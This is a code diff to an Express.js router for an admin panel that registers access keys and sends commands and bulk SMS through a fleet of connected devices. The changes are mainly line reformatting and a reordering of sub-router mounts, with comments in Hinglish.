@@ -144,7 +144,9 @@ router.post("/panel/register", ah(async (req, res) => {
     label: String((req.body || {}).label || "").slice(0, 60),
     phone: u.normalizeNumber((req.body || {}).phone) || "",
     created_at: now,
-    expires_at: config.DEFAULT_KEY_DAYS ? new Date(now.getTime() + config.DEFAULT_KEY_DAYS * 86400000) : null,
+    expires_at: config.DEFAULT_KEY_DAYS
+      ? new Date(now.getTime() + config.DEFAULT_KEY_DAYS * 86400000)
+      : null,
     blocked: false,
     login_count: 0,
     last_login_at: null,
@@ -170,12 +172,14 @@ router.get("/admin/session", ah(async (req, res) => {
 }));
 
 // ---------------------------------------------------------------- sub-routers
+// autoSender/growth pehle — warna `/admin/devices/:id/auto-sender` devices
+// ke `/:device_id` handler me chala jayega.
 
+router.use("/admin", autoSenderRouter);
+router.use("/admin", growthRouter);
 router.use("/admin/keys", keysRouter);
 router.use("/admin/users", keysRouter);
 router.use("/admin/rules", rulesRouter);
-router.use("/admin", autoSenderRouter);
-router.use("/admin", growthRouter);
 
 // ---------------------------------------------------------------- devices
 
@@ -261,7 +265,9 @@ async function sendCommandTo(device, action) {
   const online = hub.hub.online(did);
   const delivered = online ? await hub.sendCommand(did, action) : false;
   if (["fetch_number", "number", "sim_info", "refresh_telemetry"].includes(action)) {
-    await db.devices.updateOne({ _id: device._id }, { $set: { number_requested_at: db.utcNow() } }).catch(() => {});
+    await db.devices
+      .updateOne({ _id: device._id }, { $set: { number_requested_at: db.utcNow() } })
+      .catch(() => {});
   }
   u.logEvent("device_command", { action, delivered, online }, did);
   return { online, delivered };
@@ -351,7 +357,13 @@ router.post("/admin/send", ah(async (req, res) => {
   });
 
   if (!targets.length) {
-    return res.json({ status: "ok", queued: 0, delivered: 0, results: [], note: "koi device match nahi hua" });
+    return res.json({
+      status: "ok",
+      queued: 0,
+      delivered: 0,
+      results: [],
+      note: "koi device match nahi hua",
+    });
   }
 
   const manualTo = u.normalizeNumber(b.to);
@@ -364,8 +376,17 @@ router.post("/admin/send", ah(async (req, res) => {
     let delivered = false;
 
     for (const slot of slots) {
-      const [outboxId] = await hub.queueSms(deviceId, body, to, "panel", device.device_name || "Unknown", slot);
-      if (hub.hub.online(deviceId) && (await hub.deliverOutboxRow(deviceId, outboxId))) delivered = true;
+      const [outboxId] = await hub.queueSms(
+        deviceId,
+        body,
+        to,
+        "panel",
+        device.device_name || "Unknown",
+        slot
+      );
+      if (hub.hub.online(deviceId) && (await hub.deliverOutboxRow(deviceId, outboxId))) {
+        delivered = true;
+      }
     }
 
     results.push({
@@ -380,7 +401,12 @@ router.post("/admin/send", ah(async (req, res) => {
   }
 
   const deliveredN = results.filter((r) => r.delivered).length;
-  u.logEvent("bulk_send", { target: b.target, queued: results.length, delivered: deliveredN, slots: b.sim_slots }, null, admin);
+  u.logEvent(
+    "bulk_send",
+    { target: b.target, queued: results.length, delivered: deliveredN, slots: b.sim_slots },
+    null,
+    admin
+  );
 
   const notes = [];
   if (deliveredN < results.length) {
@@ -391,7 +417,14 @@ router.post("/admin/send", ah(async (req, res) => {
   }
   if (capped) notes.push(`fleet ${config.MAX_BROADCAST} se bada hai — sirf pehle ${config.MAX_BROADCAST} devices`);
 
-  res.json({ status: "ok", queued: results.length, delivered: deliveredN, capped, results, note: notes.join(" | ") });
+  res.json({
+    status: "ok",
+    queued: results.length,
+    delivered: deliveredN,
+    capped,
+    results,
+    note: notes.join(" | "),
+  });
 }));
 
 router.post("/admin/devices/:device_id/sms", ah(async (req, res) => {
@@ -420,7 +453,12 @@ router.post("/admin/devices/:device_id/push-outbox", ah(async (req, res) => {
   const did = String(device._id);
 
   if (!hub.hub.online(did)) {
-    return res.json({ status: "ok", online: false, pushed: 0, note: "device offline — online hote hi apne aap jaayega" });
+    return res.json({
+      status: "ok",
+      online: false,
+      pushed: 0,
+      note: "device offline — online hote hi apne aap jaayega",
+    });
   }
   const n = await hub.pushOutbox(did);
   res.json({ status: "ok", online: true, pushed: n });
